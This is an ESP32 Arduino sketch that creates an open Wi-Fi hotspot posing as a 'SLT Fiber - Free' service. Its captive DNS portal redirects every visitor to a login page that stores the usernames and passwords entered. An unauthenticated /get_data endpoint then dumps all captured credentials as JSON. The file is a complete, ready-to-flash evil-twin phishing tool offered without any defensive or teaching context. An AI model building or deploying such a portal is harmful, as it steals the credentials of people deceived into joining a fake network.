#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <vector>

const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer server(80);

struct Form{
  String userName;
  String password;
};

std::vector<Form> dataList;


void handle_root(){
  String _html = R"rawliteral(
    <h1>ESP32 Form</h1>
    <form action="/submit" method="POST">
      Username: <input type="text" name="username"><br>
      Password: <input type="password" name="password"><br>
      <input type="submit" value="Submit">
    </form>
  )rawliteral";
  server.send(200, "text/html", _html);
}

void handle_login_submit(){
  if(server.hasArg("username") && server.hasArg("password")){
    Form res;
    res.userName = server.arg("username");
    res.password = server.arg("password");

    dataList.push_back(res);
    
    // redirect to /
    server.sendHeader("Location", "/");
    server.send(303);
  }else{
    // redirect to /
    server.sendHeader("Location", "/");
    server.send(303);
  }
}

void handle_get_data() {
  String json = "[";
  for (size_t i = 0; i < dataList.size(); i++) {
    json += "{\"username\":\"" + dataList[i].userName + "\",\"password\":\"" + dataList[i].password + "\"}";
    if (i < dataList.size() - 1) json += ",";
  }
  json += "]";
  server.send(200, "application/json", json);
}


void setup() {
  Serial.begin(115200);

  WiFi.mode(WIFI_AP);
  WiFi.softAP("SLT Fiber - Free", "");
  delay(1000);

  IPAddress ip = WiFi.softAPIP();
  Serial.println("[+] IP Address: "+ip.toString());


  // req(*) -> redirect: IP
  dnsServer.start(DNS_PORT, "*", ip);

  server.on("/", handle_root);
  server.on("/submit", HTTP_POST, handle_login_submit);
  server.on("/get_data", HTTP_GET,handle_get_data);
  server.onNotFound(handle_root);

  server.begin();
  Serial.println("[+] Server is ready!");

}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
